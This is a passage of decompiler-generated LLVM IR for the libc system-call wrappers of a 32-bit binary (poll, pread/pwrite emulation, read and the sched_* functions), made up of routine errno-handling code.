  store i32 %v0_804fbcc, i32* @ebx, align 4
  store i32 %v2_804fbd4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804fbd4, -4095
  br i1 %tmp, label %dec_label_pc_804fbec, label %dec_label_pc_804fbe0

dec_label_pc_804fbe0:                             ; preds = %entry
  %v1_804fbe0 = call i32 @__errno_location(i32 %v0_804fbcc)
  %v0_804fbe5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbe5 = sub i32 0, %v0_804fbe5
  %v2_804fbe7 = inttoptr i32 %v1_804fbe0 to i32*
  store i32 %v1_804fbe5, i32* %v2_804fbe7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fbec

dec_label_pc_804fbec:                             ; preds = %entry, %dec_label_pc_804fbe0
  %v0_804fbec = phi i32 [ %v2_804fbd4, %entry ], [ -1, %dec_label_pc_804fbe0 ]
  %v2_804fbee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fbee, i32* @edx, align 4
  %v2_804fbf0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbf0, i32* @edi, align 4
  ret i32 %v0_804fbec

; uselistorder directives
  uselistorder i32 %v2_804fbd4, { 1, 0, 2 }
  uselistorder i32 %v0_804fbcc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fbec, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbf4 = load i32, i32* @edi, align 4
  store i32 %v0_804fbf4, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804fc04 = load i32, i32* @ebx, align 4
  %v1_804fc05 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804fc0c = call i32 @poll(%pollfd* %v1_804fc05, i32 %tmp3, i32 %tmp)
  store i32 %v0_804fc04, i32* @ebx, align 4
  store i32 %v5_804fc0c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804fc0c, -4095
  br i1 %tmp10, label %dec_label_pc_804fc24, label %dec_label_pc_804fc18

dec_label_pc_804fc18:                             ; preds = %entry
  %v1_804fc18 = call i32 @__errno_location(i32 %v0_804fc04)
  %v0_804fc1d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc1d = sub i32 0, %v0_804fc1d
  %v2_804fc1f = inttoptr i32 %v1_804fc18 to i32*
  store i32 %v1_804fc1d, i32* %v2_804fc1f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fc24

dec_label_pc_804fc24:                             ; preds = %entry, %dec_label_pc_804fc18
  %v0_804fc24 = phi i32 [ %v5_804fc0c, %entry ], [ -1, %dec_label_pc_804fc18 ]
  %v2_804fc26 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fc26, i32* @edx, align 4
  %v2_804fc28 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc28, i32* @edi, align 4
  ret i32 %v0_804fc24

; uselistorder directives
  uselistorder i32 %v5_804fc0c, { 1, 0, 2 }
  uselistorder i32 %v0_804fc04, { 1, 0 }
  uselistorder label %dec_label_pc_804fc24, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_804fc2c = load i32, i32* @ebp, align 4
  %v0_804fc2d = load i32, i32* @edi, align 4
  %v0_804fc2e = load i32, i32* @esi, align 4
  %v0_804fc33 = load i32, i32* @edx, align 4
  store i32 %v0_804fc33, i32* @ebp, align 4
  %v0_804fc35 = load i32, i32* @ecx, align 4
  store i32 %v0_804fc35, i32* @ebx, align 4
  %v0_804fc37 = load i32, i32* @eax, align 4
  store i32 %v0_804fc37, i32* %stack_var_-60, align 4
  %v4_804fc55 = call i32 @__libc_lseek64(i32 %v0_804fc37, i32 0, i32 0, i32 1)
  store i32 %v4_804fc55, i32* @esi, align 4
  %v0_804fc5f = load i32, i32* @edx, align 4
  store i32 %v0_804fc5f, i32* @edi, align 4
  %v10_804fc61 = icmp eq i32 %v0_804fc5f, -1
  %v1_804fc64 = icmp eq i1 %v10_804fc61, false
  br i1 %v1_804fc64, label %dec_label_pc_804fc6b, label %dec_label_pc_804fc66

dec_label_pc_804fc66:                             ; preds = %entry
  %v10_804fc66 = icmp eq i32 %v4_804fc55, -1
  br i1 %v10_804fc66, label %dec_label_pc_804fce5, label %dec_label_pc_804fc6b

dec_label_pc_804fc6b:                             ; preds = %dec_label_pc_804fc66, %entry
  store i32 %v0_804fc37, i32* %stack_var_-60, align 4
  %v4_804fc79 = call i32 @__libc_lseek64(i32 %v0_804fc37, i32 %arg1, i32 %arg2, i32 0)
  %v0_804fc81 = load i32, i32* @edx, align 4
  %v1_804fc81 = add i32 %v0_804fc81, 1
  %v8_804fc81 = icmp eq i32 %v1_804fc81, 0
  %v1_804fc82 = icmp eq i1 %v8_804fc81, false
  br i1 %v1_804fc82, label %dec_label_pc_804fc87, label %dec_label_pc_804fc84

dec_label_pc_804fc84:                             ; preds = %dec_label_pc_804fc6b
  %v1_804fc84 = add i32 %v4_804fc79, 1
  %v8_804fc84 = icmp eq i32 %v1_804fc84, 0
  br i1 %v8_804fc84, label %dec_label_pc_804fce5, label %dec_label_pc_804fc87

dec_label_pc_804fc87:                             ; preds = %dec_label_pc_804fc84, %dec_label_pc_804fc6b
  %v0_804fc9c = phi i32 [ %v1_804fc84, %dec_label_pc_804fc84 ], [ %v4_804fc79, %dec_label_pc_804fc6b ]
  %v12_804fc87 = icmp eq i32 %arg3, 1
  %v1_804fc8c = icmp eq i1 %v12_804fc87, false
  %v0_804fc9d = load i32, i32* @ebx, align 4
  store i32 %v0_804fc37, i32* %stack_var_-60, align 4
  br i1 %v1_804fc8c, label %dec_label_pc_804fc9c, label %dec_label_pc_804fc8e

dec_label_pc_804fc8e:                             ; preds = %dec_label_pc_804fc87
  %v3_804fc95 = call i32 @__libc_write(i32 %v0_804fc37, i32 %v0_804fc9d, i32 %v1_804fc81)
  br label %dec_label_pc_804fca8

dec_label_pc_804fc9c:                             ; preds = %dec_label_pc_804fc87
  %v3_804fca3 = call i32 @__libc_read(i32 %v0_804fc37, i32 %v0_804fc9d, i32 %v0_804fc9c)
  br label %dec_label_pc_804fca8

dec_label_pc_804fca8:                             ; preds = %dec_label_pc_804fc8e, %dec_label_pc_804fc9c
  %storemerge = phi i32 [ %v3_804fca3, %dec_label_pc_804fc9c ], [ %v3_804fc95, %dec_label_pc_804fc8e ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804fcad = load i32, i32* %stack_var_-60, align 4
  %v1_804fcad = call i32 @__errno_location(i32 %v0_804fcad)
  store i32 %v1_804fcad, i32* @ebx, align 4
  %v1_804fcb4 = inttoptr i32 %v1_804fcad to i32*
  %v2_804fcb4 = load i32, i32* %v1_804fcb4, align 4
  %v0_804fcbc = load i32, i32* @edi, align 4
  %v0_804fcbd = load i32, i32* @esi, align 4
  store i32 %v0_804fc37, i32* %stack_var_-60, align 4
  %v4_804fcc2 = call i32 @__libc_lseek64(i32 %v0_804fc37, i32 %v0_804fcbd, i32 %v0_804fcbc, i32 0)
  %v0_804fcca = load i32, i32* @edx, align 4
  %v8_804fcca = icmp eq i32 %v0_804fcca, -1
  %v1_804fccb = icmp eq i1 %v8_804fcca, false
  br i1 %v1_804fccb, label %dec_label_pc_804fcdd, label %dec_label_pc_804fccd

dec_label_pc_804fccd:                             ; preds = %dec_label_pc_804fca8
  %v8_804fccd = icmp eq i32 %v4_804fcc2, -1
  %v1_804fcce = icmp eq i1 %v8_804fccd, false
  br i1 %v1_804fcce, label %dec_label_pc_804fcdd, label %dec_label_pc_804fcd0

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fccd
  %v0_804fcd0 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804fcd0 = icmp eq i32 %v0_804fcd0, -1
  %v1_804fcd3 = icmp eq i1 %v10_804fcd0, false
  br i1 %v1_804fcd3, label %dec_label_pc_804fce5, label %dec_label_pc_804fcd5

dec_label_pc_804fcd5:                             ; preds = %dec_label_pc_804fcd0
  %v1_804fcd9 = load i32, i32* @ebx, align 4
  %v2_804fcd9 = inttoptr i32 %v1_804fcd9 to i32*
  store i32 %v2_804fcb4, i32* %v2_804fcd9, align 4
  br label %dec_label_pc_804fce8

dec_label_pc_804fcdd:                             ; preds = %dec_label_pc_804fccd, %dec_label_pc_804fca8
  %v1_804fce1 = load i32, i32* @ebx, align 4
  %v2_804fce1 = inttoptr i32 %v1_804fce1 to i32*
  store i32 %v2_804fcb4, i32* %v2_804fce1, align 4
  br label %dec_label_pc_804fce8

dec_label_pc_804fce5:                             ; preds = %dec_label_pc_804fcd0, %dec_label_pc_804fc84, %dec_label_pc_804fc66
  store i32 -1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fce8

dec_label_pc_804fce8:                             ; preds = %dec_label_pc_804fcdd, %dec_label_pc_804fcd5, %dec_label_pc_804fce5
  %v0_804fceb = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804fc2e, i32* @esi, align 4
  store i32 %v0_804fc2d, i32* @edi, align 4
  store i32 %v0_804fc2c, i32* @ebp, align 4
  ret i32 %v0_804fceb

; uselistorder directives
  uselistorder i32 %v2_804fcb4, { 1, 0 }
  uselistorder i32 %v0_804fc9d, { 1, 0 }
  uselistorder i32 %v0_804fc37, { 2, 1, 4, 0, 3, 6, 5, 8, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fca8, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_804fcf2 = load i32, i32* @esi, align 4
  %v0_804fcf3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_804fd1a = call i32 @__fake_pread_write64(i32 %v0_804fcf3, i32 %v0_804fcf2, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v5_804fd1a
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_804fd1f = load i32, i32* @esi, align 4
  %v0_804fd20 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_804fd47 = call i32 @__fake_pread_write64(i32 %v0_804fd20, i32 %v0_804fd1f, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v5_804fd47

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v0_804fd4c = load i32, i32* @ebp, align 4
  %v0_804fd4d = load i32, i32* @edi, align 4
  %v0_804fd4e = load i32, i32* @esi, align 4
  %v0_804fd53 = load i32, i32* @eax, align 4
  store i32 %v0_804fd53, i32* @edi, align 4
  %v0_804fd55 = load i32, i32* @edx, align 4
  store i32 %v0_804fd55, i32* @esi, align 4
  %v0_804fd57 = load i32, i32* @ecx, align 4
  store i32 %v0_804fd57, i32* @ebx, align 4
  store i32 %v0_804fd53, i32* %stack_var_-44, align 4
  %v3_804fd5e = call i32 @__GI___libc_lseek(i32 %v0_804fd53, i32 0, i32 1)
  %v13_804fd6a = icmp eq i32 %v3_804fd5e, -1
  br i1 %v13_804fd6a, label %dec_label_pc_804fdc9, label %dec_label_pc_804fd71

dec_label_pc_804fd71:                             ; preds = %entry
  %v0_804fd78 = load i32, i32* @edi, align 4
  store i32 %v0_804fd78, i32* %stack_var_-44, align 4
  %v3_804fd79 = call i32 @__GI___libc_lseek(i32 %v0_804fd78, i32 %arg1, i32 0)
  %v8_804fd81 = icmp eq i32 %v3_804fd79, -1
  br i1 %v8_804fd81, label %dec_label_pc_804fdc9, label %dec_label_pc_804fd84

dec_label_pc_804fd84:                             ; preds = %dec_label_pc_804fd71
  %v12_804fd84 = icmp eq i32 %arg2, 1
  %v1_804fd89 = icmp eq i1 %v12_804fd84, false
  %v0_804fd97 = load i32, i32* @ebx, align 4
  %v0_804fd98 = load i32, i32* @esi, align 4
  %v0_804fd99 = load i32, i32* @edi, align 4
  store i32 %v0_804fd99, i32* %stack_var_-44, align 4
  br i1 %v1_804fd89, label %dec_label_pc_804fd96, label %dec_label_pc_804fd8b

dec_label_pc_804fd8b:                             ; preds = %dec_label_pc_804fd84
  %v3_804fd8f = call i32 @__libc_write(i32 %v0_804fd99, i32 %v0_804fd98, i32 %v0_804fd97)
  br label %dec_label_pc_804fd9f

dec_label_pc_804fd96:                             ; preds = %dec_label_pc_804fd84
  %v3_804fd9a = call i32 @__libc_read(i32 %v0_804fd99, i32 %v0_804fd98, i32 %v0_804fd97)
  br label %dec_label_pc_804fd9f

dec_label_pc_804fd9f:                             ; preds = %dec_label_pc_804fd8b, %dec_label_pc_804fd96
  %storemerge = phi i32 [ %v3_804fd9a, %dec_label_pc_804fd96 ], [ %v3_804fd8f, %dec_label_pc_804fd8b ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_804fda4 = load i32, i32* %stack_var_-44, align 4
  %v1_804fda4 = call i32 @__errno_location(i32 %v0_804fda4)
  store i32 %v1_804fda4, i32* @ebx, align 4
  %v1_804fdab = inttoptr i32 %v1_804fda4 to i32*
  %v2_804fdab = load i32, i32* %v1_804fdab, align 4
  store i32 %v2_804fdab, i32* @ebp, align 4
  %v0_804fdb4 = load i32, i32* @edi, align 4
  store i32 %v0_804fdb4, i32* %stack_var_-44, align 4
  %v3_804fdb5 = call i32 @__GI___libc_lseek(i32 %v0_804fdb4, i32 %v3_804fd5e, i32 0)
  %v8_804fdbd = icmp eq i32 %v3_804fdb5, -1
  %v1_804fdbe = icmp eq i1 %v8_804fdbd, false
  br i1 %v1_804fdbe, label %dec_label_pc_804fdc5, label %dec_label_pc_804fdc0

dec_label_pc_804fdc0:                             ; preds = %dec_label_pc_804fd9f
  %v0_804fdc0 = load i32, i32* @esi, align 4
  %v10_804fdc0 = icmp eq i32 %v0_804fdc0, -1
  %v1_804fdc3 = icmp eq i1 %v10_804fdc0, false
  br i1 %v1_804fdc3, label %dec_label_pc_804fdc9, label %dec_label_pc_804fdc5

dec_label_pc_804fdc5:                             ; preds = %dec_label_pc_804fdc0, %dec_label_pc_804fd9f
  %v0_804fdc5 = load i32, i32* @ebp, align 4
  %v1_804fdc5 = load i32, i32* @ebx, align 4
  %v2_804fdc5 = inttoptr i32 %v1_804fdc5 to i32*
  store i32 %v0_804fdc5, i32* %v2_804fdc5, align 4
  %v0_804fdcf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fdcc

dec_label_pc_804fdc9:                             ; preds = %dec_label_pc_804fdc0, %dec_label_pc_804fd71, %entry
  br label %dec_label_pc_804fdcc

dec_label_pc_804fdcc:                             ; preds = %dec_label_pc_804fdc5, %dec_label_pc_804fdc9
  %v0_804fdcf = phi i32 [ %v0_804fdcf.pre, %dec_label_pc_804fdc5 ], [ -1, %dec_label_pc_804fdc9 ]
  store i32 %v0_804fd4e, i32* @esi, align 4
  store i32 %v0_804fd4d, i32* @edi, align 4
  store i32 %v0_804fd4c, i32* @ebp, align 4
  ret i32 %v0_804fdcf

; uselistorder directives
  uselistorder i32 %v0_804fd99, { 1, 0, 2 }
  uselistorder i32 %v0_804fd98, { 1, 0 }
  uselistorder i32 %v0_804fd97, { 1, 0 }
  uselistorder i32 %v3_804fd5e, { 1, 0 }
  uselistorder i32 %v0_804fd53, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804fdcc, { 1, 0 }
  uselistorder label %dec_label_pc_804fd9f, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804fdd6 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_804fdf4 = call i32 @__fake_pread_write(i32 %v0_804fdd6, i32 %arg4, i32 1)
  ret i32 %v3_804fdf4
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804fdf9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_804fe17 = call i32 @__fake_pread_write(i32 %v0_804fdf9, i32 %arg4, i32 0)
  ret i32 %v3_804fe17

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe1c = load i32, i32* @edi, align 4
  store i32 %v0_804fe1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fe2c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fe34 = call i32 @read(i32 %v0_804fe2c)
  store i32 %v0_804fe2c, i32* @ebx, align 4
  store i32 %v1_804fe34, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fe34, -4095
  br i1 %tmp, label %dec_label_pc_804fe4c, label %dec_label_pc_804fe40

dec_label_pc_804fe40:                             ; preds = %entry
  %v1_804fe40 = call i32 @__errno_location(i32 %v0_804fe2c)
  %v0_804fe45 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe45 = sub i32 0, %v0_804fe45
  %v2_804fe47 = inttoptr i32 %v1_804fe40 to i32*
  store i32 %v1_804fe45, i32* %v2_804fe47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fe4c

dec_label_pc_804fe4c:                             ; preds = %entry, %dec_label_pc_804fe40
  %v0_804fe4c = phi i32 [ %v1_804fe34, %entry ], [ -1, %dec_label_pc_804fe40 ]
  %v2_804fe50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fe50, i32* @edi, align 4
  ret i32 %v0_804fe4c

; uselistorder directives
  uselistorder i32 %v1_804fe34, { 1, 0, 2 }
  uselistorder i32 %v0_804fe2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe4c, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe54 = load i32, i32* @edi, align 4
  store i32 %v0_804fe54, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fe5c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fe64 = call i32 @sched_get_priority_max(i32 %v0_804fe5c)
  store i32 %v0_804fe5c, i32* @ebx, align 4
  store i32 %v1_804fe64, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fe64, -4095
  br i1 %tmp, label %dec_label_pc_804fe7c, label %dec_label_pc_804fe70

dec_label_pc_804fe70:                             ; preds = %entry
  %v1_804fe70 = call i32 @__errno_location(i32 %v0_804fe5c)
  %v0_804fe75 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe75 = sub i32 0, %v0_804fe75
  %v2_804fe77 = inttoptr i32 %v1_804fe70 to i32*
  store i32 %v1_804fe75, i32* %v2_804fe77, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fe7c

dec_label_pc_804fe7c:                             ; preds = %entry, %dec_label_pc_804fe70
  %v0_804fe7c = phi i32 [ %v1_804fe64, %entry ], [ -1, %dec_label_pc_804fe70 ]
  %v2_804fe80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fe80, i32* @edi, align 4
  ret i32 %v0_804fe7c

; uselistorder directives
  uselistorder i32 %v1_804fe64, { 1, 0, 2 }
  uselistorder i32 %v0_804fe5c, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fe7c, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe84 = load i32, i32* @edi, align 4
  store i32 %v0_804fe84, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fe8c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fe94 = call i32 @sched_get_priority_min(i32 %v0_804fe8c)
  store i32 %v0_804fe8c, i32* @ebx, align 4
  store i32 %v1_804fe94, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fe94, -4095
  br i1 %tmp, label %dec_label_pc_804feac, label %dec_label_pc_804fea0

dec_label_pc_804fea0:                             ; preds = %entry
  %v1_804fea0 = call i32 @__errno_location(i32 %v0_804fe8c)
  %v0_804fea5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fea5 = sub i32 0, %v0_804fea5
  %v2_804fea7 = inttoptr i32 %v1_804fea0 to i32*
  store i32 %v1_804fea5, i32* %v2_804fea7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804feac

dec_label_pc_804feac:                             ; preds = %entry, %dec_label_pc_804fea0
  %v0_804feac = phi i32 [ %v1_804fe94, %entry ], [ -1, %dec_label_pc_804fea0 ]
  %v2_804feb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804feb0, i32* @edi, align 4
  ret i32 %v0_804feac

; uselistorder directives
  uselistorder i32 %v1_804fe94, { 1, 0, 2 }
  uselistorder i32 %v0_804fe8c, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_min, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804feac, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804feb4 = load i32, i32* @ebx, align 4
  store i32 %v0_804feb4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fec7 = call i32 @sched_getparam(i32 %v0_804feb4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804fec7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fec7, -4095
  br i1 %tmp, label %dec_label_pc_804fee0, label %dec_label_pc_804fed4

dec_label_pc_804fed4:                             ; preds = %entry
  %v0_804fed4 = load i32, i32* %stack_var_-4, align 4
  %v1_804fed4 = call i32 @__errno_location(i32 %v0_804fed4)
  %v0_804fed9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fed9 = sub i32 0, %v0_804fed9
  %v2_804fedb = inttoptr i32 %v1_804fed4 to i32*
  store i32 %v1_804fed9, i32* %v2_804fedb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %entry, %dec_label_pc_804fed4
  %v0_804fee0 = phi i32 [ %v4_804fec7, %entry ], [ -1, %dec_label_pc_804fed4 ]
  %v2_804fee4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fee4, i32* @ebx, align 4
  ret i32 %v0_804fee0

; uselistorder directives
  uselistorder i32 %v4_804fec7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sched_getparam, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fee0, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fee8 = load i32, i32* @edi, align 4
  store i32 %v0_804fee8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804fef0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fef8 = call i32 @sched_getscheduler(i32 %v0_804fef0)
  store i32 %v0_804fef0, i32* @ebx, align 4
  store i32 %v1_804fef8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fef8, -4095
  br i1 %tmp, label %dec_label_pc_804ff10, label %dec_label_pc_804ff04

dec_label_pc_804ff04:                             ; preds = %entry
  %v1_804ff04 = call i32 @__errno_location(i32 %v0_804fef0)
  %v0_804ff09 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff09 = sub i32 0, %v0_804ff09
  %v2_804ff0b = inttoptr i32 %v1_804ff04 to i32*
  store i32 %v1_804ff09, i32* %v2_804ff0b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ff10

dec_label_pc_804ff10:                             ; preds = %entry, %dec_label_pc_804ff04
  %v0_804ff10 = phi i32 [ %v1_804fef8, %entry ], [ -1, %dec_label_pc_804ff04 ]
  %v2_804ff14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff14, i32* @edi, align 4
  ret i32 %v0_804ff10

; uselistorder directives
  uselistorder i32 %v1_804fef8, { 1, 0, 2 }
  uselistorder i32 %v0_804fef0, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_getscheduler, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ff10, { 1, 0 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff18 = load i32, i32* @edi, align 4
  store i32 %v0_804ff18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804ff28 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ff30 = call i32 @sched_setscheduler(i32 %v0_804ff28, i32 %tmp8, i32 %tmp6)
  store i32 %v0_804ff28, i32* @ebx, align 4
  store i32 %v3_804ff30, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804ff30, -4095
  br i1 %tmp, label %dec_label_pc_804ff48, label %dec_label_pc_804ff3c

dec_label_pc_804ff3c:                             ; preds = %entry
  %v1_804ff3c = call i32 @__errno_location(i32 %v0_804ff28)
  %v0_804ff41 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff41 = sub i32 0, %v0_804ff41
  %v2_804ff43 = inttoptr i32 %v1_804ff3c to i32*
  store i32 %v1_804ff41, i32* %v2_804ff43, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ff48

dec_label_pc_804ff48:                             ; preds = %entry, %dec_label_pc_804ff3c
  %v0_804ff48 = phi i32 [ %v3_804ff30, %entry ], [ -1, %dec_label_pc_804ff3c ]
  %v2_804ff4a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ff4a, i32* @edx, align 4
  %v2_804ff4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ff4c, i32* @edi, align 4
  ret i32 %v0_804ff48

; uselistorder directives
  uselistorder i32 %v3_804ff30, { 1, 0, 2 }
  uselistorder i32 %v0_804ff28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ff48, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff50 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff50, i32* %stack_var_-4, align 4
  %v1_804ff59 = call i32 @sched_yield(i32 %v0_804ff50)
  store i32 %v1_804ff59, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ff59, -4095
  br i1 %tmp, label %dec_label_pc_804ff70, label %dec_label_pc_804ff64

dec_label_pc_804ff64:                             ; preds = %entry
  %v0_804ff64 = load i32, i32* %stack_var_-4, align 4
  %v1_804ff64 = call i32 @__errno_location(i32 %v0_804ff64)
